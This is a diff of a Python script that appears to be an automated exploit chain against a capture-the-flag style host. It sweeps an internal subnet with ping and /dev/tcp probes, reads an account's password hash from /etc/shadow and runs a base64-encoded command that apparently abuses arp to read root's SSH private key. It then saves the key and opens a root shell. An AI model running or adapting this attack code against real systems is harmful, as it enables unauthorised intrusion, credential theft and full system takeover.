@@ -327,14 +327,16 @@ def Game_Tester2(username,password):
 
 	client.connect('10.10.11.110', username=username, password=password)
 
-#	stdin, stdout, stderr = client.exec_command("ssh -o StrictHostKeyChecking=no game-tester@$(for x in $(seq 1 254); do (ping -c 1 172.19.0.$x &>/dev/null && echo \"172.19.0.$x\" &); done | tail -n 1) \"curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'\" || touch pene || exit")
+#	stdin, stdout, stderr = client.exec_command("ssh -o StrictHostKeyChecking=no game-tester@$(for x in $(seq 1 254); do (ping -c 1 172.19.0.$x &>/dev/null && echo \"172.19.0.$x\" &); done | tail -n 1) \"curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'\"")
 
-	stdin, stdout, stderr = client.exec_command("ssh -o StrictHostKeyChecking=no game-tester@172.19.0.2 \"curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'\" || ssh -o StrictHostKeyChecking=no game-tester@172.19.0.4 \"curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'\" || ssh -o StrictHostKeyChecking=no game-tester@172.19.0.3 \"curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'\"")
+	stdin, stdout, stderr = client.exec_command('ssh -o StrictHostKeyChecking=no game-tester@$(for x in $(seq 2 254); do ((ping -c 1 172.19.0.$x 1>/dev/null) && echo '' > /dev/tcp/172.19.0.$x/22 && echo "172.19.0.$x" &); done 2>/dev/null) "curl http://127.0.0.1:9999/autoplay -d \'rounds=-1\'"')
+
+
+#	stdin, stdout, stderr = client.exec_command("ssh -o StrictHostKeyChecking=no game-tester@172.19.0.2 \"curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'\" || ssh -o StrictHostKeyChecking=no game-tester@172.19.0.4 \"curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'\" || ssh -o StrictHostKeyChecking=no game-tester@172.19.0.3 \"curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'\"")
 
 #	stdin, stdout, stderr = client.exec_command("ssh -o StrictHostKeyChecking=no game-tester@172.19.0.2 \"curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'\"")
 
 def Get_Hash_Adm(username,password):
-
 	client = paramiko.SSHClient()
 	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
@@ -342,7 +344,9 @@ def Get_Hash_Adm(username,password):
 
 #	stdin, stdout, stderr = client.exec_command('ssh -o StrictHostKeyChecking=no game-tester@$(for x in $(seq 1 254); do (ping -c 1 172.19.0.$x &>/dev/null && echo \"172.19.0.$x\" &); done | tail -n 1) "cat /etc/shadow | grep \'game-adm\' | cut -d\':\' -f2"')
 
-	stdin, stdout, stderr = client.exec_command('ssh -o StrictHostKeyChecking=no game-tester@172.19.0.3 "cat /etc/shadow | grep \'game-adm\' | cut -d\':\' -f2"')
+	stdin, stdout, stderr = client.exec_command('ssh -o StrictHostKeyChecking=no game-tester@$(for x in $(seq 2 254); do ((ping -c 1 172.19.0.$x 1>/dev/null) && echo '' > /dev/tcp/172.19.0.$x/22 && echo "172.19.0.$x" &); done 2>/dev/null) "cat /etc/shadow | grep \'game-adm\' | cut -d\':\' -f2"')
+
+#	stdin, stdout, stderr = client.exec_command('ssh -o StrictHostKeyChecking=no game-tester@172.19.0.2 "cat /etc/shadow | grep \'game-adm\' | cut -d\':\' -f2"')
 
 	Hash_Adm = stdout.read().decode('utf-8')
 
@@ -353,25 +357,27 @@ def Get_Hash_Adm(username,password):
 
 
 def GetID_RSA(username,password, username_adm, password_adm):
-	ssh_command = f"ssh {username}@10.10.11.110"
+	client = paramiko.SSHClient()
+	client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+	client.connect("10.10.11.110", username=username, password=password)
+
+	stdin, stdout, stderr = client.exec_command(f'su {username_adm} -c "echo \"L3Vzci9zYmluL2FycCAtZiAtdiAnL3Jvb3QvLnNzaC9pZF9yc2EnIDI+JjEgfCBncmVwIC12RSAnYXJwfGZvcm1hdHxob3N0JyB8IHNlZCAncy8+PiAvLycK\" | base64 -d | bash"')
+	time.sleep(1)
+	stdin.write(f'{password_adm}\n')
+
+	id_rsa = stdout.read().decode('utf-8')
+
+	with open('id_rsa', 'w') as f:
+            f.write(id_rsa)
+
+
+def GetRoot_Shell():
+	ssh_command = "ssh -i id_rsa root@10.10.11.110"
 
 	ssh_session = pexpect.spawn(ssh_command, timeout=None)
 
-	ssh_session.expect('password:')
-
-	ssh_session.sendline(password)
-
-	ssh_session.sendline("su game-tester")
-
-	ssh_session.expect('password:')
-
-	ssh_session.sendline(password_adm)
-
-#	ssh_session.sendline("ssh -o StrictHostKeyChecking=no game-tester@172.19.0.4 \"curl http://127.0.0.1:9999/autoplay -d 'rounds=-1'\" || exit")
-
 	ssh_session.interact()
-
-
 
 
 if __name__ == "__main__":
@@ -408,9 +414,9 @@ if __name__ == "__main__":
 
 #	Game_Tester(User_drew, Pass_drew)
 
-#	Game_Tester2(User_drew, Pass_drew)
+	Game_Tester2(User_drew, Pass_drew)
 
-#	time.sleep(5)
+	time.sleep(40)
 
 	Get_Hash_Adm(User_drew, Pass_drew)
 
@@ -421,9 +427,14 @@ if __name__ == "__main__":
 
 	print(Pass_Adm)
 
-#	os.remove("hash_adm")
+	os.remove("hash_adm")
 
-#	os.remove("pass")
+	os.remove("pass")
 
 	GetID_RSA(User_drew, Pass_drew, "game-adm", Pass_Adm)
+
+	os.system('chmod 600 id_rsa')
+
+	GetRoot_Shell()
+
 
